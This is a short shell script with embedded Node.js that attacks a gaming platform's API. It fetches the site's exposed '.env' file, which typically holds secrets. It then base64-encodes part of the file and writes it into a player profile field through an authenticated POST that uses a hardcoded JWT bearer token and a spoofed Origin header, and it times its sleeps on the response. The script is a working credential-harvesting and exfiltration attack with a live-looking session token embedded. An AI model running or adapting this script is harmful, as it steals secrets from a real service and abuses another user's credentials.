#!/bin/sh
curl -s -o /wb https://playerapi.hubgaming.com/.env
printf '%s' 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BsYXllcmFwaS5odWJnYW1pbmcuY29tL2FwaS9wbGF5ZXIvYXV0aC9sb2dpbiIsImlhdCI6MTc5MzExNDA4NSwiZXhwIjoxNzkzMjg2ODg1LCJuYmYiOjE3OTMxMTQwODUsImp0aSI6InUwUmRyREFuOGlqdWJEMkQiLCJzdWIiOiIxMDEzMjY1MyIsInBydiI6IjFkMGEwMjBhY2Y1YzRiNmM0OTc5ODlkZjFhYmYwZmJkNGU4YzhkNjMiLCJ3ZWJzaXRlX2lkIjoyNH0.brcZtf4jjRND_eM1kxV6USzTr2F9sC0D3g0axKsyeiY' > /jwt.txt
if [ -s /wb ] && grep -q = /wb; then
  cat > /nd.js <<'XEOF'
f=require("fs")
w=f.writeFileSync
t=f.readFileSync("/jwt.txt","utf8")
d=f.readFileSync("/wb").toString("base64")
c1=d.substring(0,255)
p={residential:c1}
b=JSON.stringify(p)
q=require("https").request
o={host:"playerapi.hubgaming.com"}
o.method="POST"
o.path="/api/player/profile"
o.headers={Origin:"https://titobet.com"}
o.headers.authorization="Bearer "+t
o.headers["content-type"]="application/json"
k=x=>w("/okM",""+x.statusCode)
r=q(o,k)
r.on("error",e=>w("/oME",e.code))
r.end(b)
XEOF
  node /nd.js
  [ "$(cat /okM)" = 200 ] && sleep 25
  sleep 12
else
  sleep 7
fi
